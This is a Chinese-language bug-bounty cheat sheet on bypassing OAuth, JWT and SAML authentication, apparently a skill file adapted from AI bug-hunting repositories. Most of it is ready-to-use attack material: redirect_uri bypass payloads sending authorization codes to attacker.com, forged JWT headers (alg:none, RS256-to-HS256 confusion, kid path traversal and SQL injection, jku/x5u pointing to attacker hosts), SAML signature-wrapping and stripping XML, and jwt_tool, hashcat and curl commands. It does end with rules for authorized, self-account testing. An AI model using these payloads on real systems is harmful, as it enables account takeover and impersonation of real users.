# OAuth / JWT / SAML 认证绕过

> 认证机制层的「三件套」：OAuth 把认证外包给 IdP，JWT 是常见 token 格式，SAML 是 SSO 联邦断言。能伪造任意用户身份 / 把授权码劫到攻击者域 = 账号接管（Account Takeover, ATO），SRC 里长期霸榜 Critical，典型 $500–$20,000+。本地 src-hunter 命中本类的高危 H1 报告约 240 份。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
- 权威公开源：PortSwigger / HackTricks / OWASP（仅作背景，payload 均取自上述本地文件）

---

## 1. 触发信号

- 授权请求 URL 出现 `redirect_uri` / `client_id` / `state` / `response_type` / `code`
- 登录后请求带 `Authorization: Bearer eyJ...`（三段式 JWT）；或 Cookie 里藏 `eyJ`
- 出现 `/saml/acs`、`SAMLResponse=`、`<saml:Response>`、`SAMLRequest`
- `.well-known/openid-configuration`、`/.well-known/jwks.json` 可访问
- 页面存在社交登录按钮（Google/Facebook/Apple/微信）→ OAuth 攻击面必然存在
- 开放重定向参数（`url`/`next`/`return`/`redirect`）常与 OAuth 紧耦合

## 2. 高频入口点

**端点**（本地 src-hunter 00-index 路由表 + Claude-BugHunter hunt-oauth）：

```
/oauth/authorize   /oauth2/authorize   /connect/authorize   /oauth/token
/auth/callback     /oauth/callback     /saml/login          /saml/acs
/.well-known/openid-configuration      /jwks.json   /.well-known/jwks.json
登录后：Authorization: Bearer eyJ...   回调：?code=xxx&state=xxx
```

**关键参数**：`redirect_uri`、`state`、`nonce`、`response_type`、`scope`、`client_id`、`client_secret`、`code`、`kid`、`jku`、`x5u`、`alg`。

**鉴权线索**（hunt-jwt-crypto）：token 响应 `"token":"eyJ..."`；`Set-Cookie: token=eyJ...`；JWKS 端点存在 → 立刻进入 JWT 子流程。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **确认机制**：抓授权请求，记录 `client_id/redirect_uri/state/nonce/response_type`；解码 JWT header 看 `alg`（RS256 → 试密钥混淆；任何 alg → 先免费试 `alg:none`）；抓 SAMLResponse 解码看结构。
2. **redirect_uri 校验**：先测子串/后缀/`@`/编码/CRLF 绕过（§4.1）。命中 → code 落到攻击者域 → 换 token = ATO。
3. **state/nonce 校验**：删 `state` 流程是否照走；固定 state 复用；state 是否仅前端校验。缺失 → CSRF 登录绑定。
4. **PKCE 校验**：授权请求是否带 `code_challenge`；不带仍能换 token = PKCE 关闭（移动/SPA 高危）。
5. **JWT 探针**：按 `alg:none` → 大小写变体 → RS256→HS256 混淆 → `kid` 注入 → `jku/x5u/jwk` 注入 → 弱密钥爆破的顺序试（§4.2）。
6. **SAML**：先试签名剥离，再试 XSW 包裹 / comment 注入（§4.3）。
7. **拿最小证据即停**：任何一条命中都以「200 + 越权内容脱敏截图」为终点，不实际执行管理操作。

## 4. Payload 区（每条标注出处）

### 4.1 OAuth redirect_uri / state `[本地 src-hunter 00-index/10-oauth-redirect + Claude-BugHunter hunt-oauth]`

```text
# 子串 / 后缀匹配缺陷
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com.evil.com
?redirect_uri=https://attacker.com/target.com

# @ 用户态 / 路径遍历
?redirect_uri=https://target.com@attacker.com
?redirect_uri=https://target.com/../attacker.com/cb
?redirect_uri=https://target.com#@attacker.com

# URL 解析差异（服务端 startsWith vs 浏览器 WHATWG 实际跳转）
?redirect_uri=https://target.com%2f@attacker.com
?redirect_uri=https://target.com%5c@attacker.com
?redirect_uri=https://attacker.com\@target.com
?redirect_uri=https://target.com%2eattacker.com

# 通配符 / 大小写 / 空值 / CRLF
?redirect_uri=https://attacker.target.com
?redirect_uri=HTTPS://target.com.attacker.com
?redirect_uri=
?redirect_uri=https://target.com%0d%0aLocation:%20https://attacker.com

# 参数污染（多个 redirect_uri）
?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb
```

**判定**：授权端点放行后 `Location:` 跳到攻击者域并带回 `?code=AUTHCODE` → 命中。关键在「服务端放行」与「浏览器实际跳转」两个 gate 都要过（hunt-oauth 明确：服务端 accept + 浏览器停在合法 host = 不是 ATO）。

**state 缺失 → CSRF 登录绑定** `[本地 src-hunter]`：

```text
1. 攻击者用自己账号走 OAuth，截获 callback?code=ATTACKER_CODE
2. 诱导受害者访问 /callback?code=ATTACKER_CODE（img/iframe）
3. 受害者账号绑定到攻击者身份 → 攻击者用自己身份登录受害者账号
防御检测：授权请求是否携带 state，且 state 是否会话绑定（非仅前端占位）
```

### 4.2 JWT 伪造 `[本地 src-hunter 12-jwt + Claude-BugHunter hunt-jwt-crypto + Claude-Red offensive-jwt]`

```text
# alg=none（去掉签名，保留结尾点；试大小写变体 none/None/NONE/nOnE）
{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.

# RS256 → HS256 密钥混淆（拿公钥当 HMAC secret）
1. 取公钥：/.well-known/jwks.json 或 openssl s_client -connect target:443 | openssl x509 -pubkey
2. jwt_tool <token> -X k -pk public.pem   （或 PyJWT: jwt.encode(payload, public_key, "HS256")）

# kid 路径遍历（用 /dev/null 空内容作密钥 → 空 secret 签 HS256）
{"alg":"HS256","kid":"../../../../../../../dev/null"}

# kid SQL 注入
{"alg":"HS256","kid":"key1' UNION SELECT 'attacker_secret'--"}

# jku 注入（远程 JWKS）/ x5u 注入（远程证书）/ jwk 内嵌自控公钥
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}
{"alg":"RS256","jwk":{"kty":"RSA","n":"<你的模数>","e":"AQAB"}}

# 弱密钥爆破（HS256 才可爆破）
hashcat -m 16500 jwt.txt rockyou.txt
jwt_tool <token> -C -d wordlist.txt

# exp/nbf 篡改：删 exp 或 nbf 设过去、exp 设 2099
{"sub":"administrator","nbf":1000000000,"exp":4102444800}
```

**纪律**：payload 形状必须对齐真实 token（先 `echo <token> | cut -d. -f2 | base64 -d` 解码，保留原 claim 名，只改身份/角色字段）；伪造成功后立即打 admin 端点，不要反复重放自己的 `/my-account`。

### 4.3 SAML 签名绕过 / XML 包裹 `[本地 src-hunter 11-saml + Claude-BugHunter hunt-saml]`

```xml
<!-- XSW（XML Signature Wrapping）：把恶意断言放在已签名断言之前，SP 处理第一条 -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- 覆盖 #legit，仍验签通过 --></ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- 签名剥离：删掉整个 <ds:Signature>，改 NameID=admin，重编码回发
     服务端不校验签名存在 = admin ATO -->
xmlstarlet ed -N ds="http://www.w3.org/2000/09/xmldsig#" -d "//ds:Signature" saml.xml

<!-- comment 注入：签名 C14N 与 SP 文本提取对注释处理不一致
     CVE-2017-11428 (Ruby-SAML/OneLogin)、CVE-2016-5697 -->
<NameID>admin@company.com<!---->.evil.com</NameID>
```

**工作流**：`echo "SAMLResponse_BASE64" | base64 -d > saml.xml` → 改 NameID/AttributeStatement → `base64 -w0 saml.xml` → URL 编码后作为 `SAMLResponse=` 提交到 `/saml/acs`。工具：SAMLRaider（Burp 插件，XSW 1–8 变体）、samlmagic。

### 4.4 Bypass 矩阵 `[本地 src-hunter 00-index §4]`

| 拦 | 绕 |
|---|---|
| redirect_uri 字面/精确比较 | 子串、`@` 字符、URL 编码、CRLF、子域、参数污染 |
| state 必填 | 看是否真会话绑定还是仅占位 / 仅前端校验 |
| PKCE 必启用 | 看授权请求是否真带 `code_challenge`；老客户端/移动端常豁免 |
| JWT alg=RS256 | 改 HS256 用公钥签；改 alg=none；kid 指向 /dev/null |
| 服务端校验 jku 域 | DNS Rebinding / 开放重定向链 / 子域接管 |
| SAML Response 验签 | XSW 包裹 / 签名剥离 / 修改未签名节点 / comment 注入 |
| 短时效 code | Referer 泄露 + 开放重定向仍可在窗口内劫持 |

## 5. 工具用法

```bash
# OAuth 全流程抓取 + OIDC discovery
curl -s https://target/.well-known/openid-configuration | jq '{authorization_endpoint,token_endpoint,jwks_uri}'
# 动态注册滥用（registration_endpoint 开放时注册攻击者 redirect_uri）
curl -X POST https://idp/connect/register -H 'Content-Type: application/json' \
  -d '{"client_name":"x","redirect_uris":["https://attacker/cb"]}'

# JWT 全套（jwt_tool）
python3 jwt_tool.py <token>              # 解析
python3 jwt_tool.py <token> -X a         # alg:none 攻击（含大小写变体）
python3 jwt_tool.py <token> -X k -pk public.pem   # RS→HS 密钥混淆
python3 jwt_tool.py <token> -X i -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py <token> -X s -pr attacker.key   # jwk/jku 签名注入
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 jwt.txt rockyou.txt     # HS256 弱密钥爆破

# SAML
echo "BASE64" | base64 -d | xmllint --format - > saml.xml   # 解码
base64 -w0 saml.xml                                          # 重编码
# Burp → SAMLRaider → XSW / 签名剥离自动化
```

> 纪律：爆破只在自持 token 上离线做，不打在线 IdP；jku 攻击者 JWKS 用完即删。

## 6. 证据要求

**「已确认」必须满足**（任一条）：
- redirect_uri 绕过：授权请求 → `Location:` 带回 `code` 落到攻击者域 → 用 code 换 `access_token`（自演两个账号，不碰真实用户）。
- JWT：伪造 token 打受保护/admin 端点返回 200 + 越权内容（他人邮箱列表 / admin 界面），并截图证明 token 携带被改 claims；401 = 该漏洞已修，换密钥混淆再试。
- SAML：改 NameID 后 `/saml/acs` 返回 admin 会话，截图。

**PoC 模板（JWT alg=none）**：

```http
原 token: eyJhbGciOiJSUzI1NiIs...
伪造:     header {"alg":"none"} + payload {"sub":"admin"} → eyJ...eyJ...
GET /admin  Authorization: Bearer <伪造 token>
→ 200 + admin 内容（脱敏截图）
```

**CVSS 参考**：redirect_uri 绕过 → ATO = 8.1/9.1；state 缺失 → 登录绑定 CSRF = 6.1；PKCE 缺失 = 5.4；JWT alg:none / RS→HS 混淆 / SAML XSW 均 = 9.8 Critical（本地 src-hunter 00-index §7.3）。

## 7. 合规边界 / 不要做的事

- **禁**：用 redirect_uri 绕过实际抓真实用户 code（诱导朋友点击也不行），用自己两个账号自演。
- **禁**：JWT 伪造 admin 后实际操作后台（删/改/建）；仅证明 200 + admin 内容。
- **禁**：SAML XSW 后进行高权限操作；仅证明会话切换。
- **禁**：jku/x5u PoC 长期托管真实 JWKS；用完即删。
- **禁**：JWT 爆破在线打 IdP；只在自己 token 上离线做。
- **脱敏**：报告里 admin 数据只留脱敏样本（邮箱前 2 + 后 2 字符），不贴完整 PII。
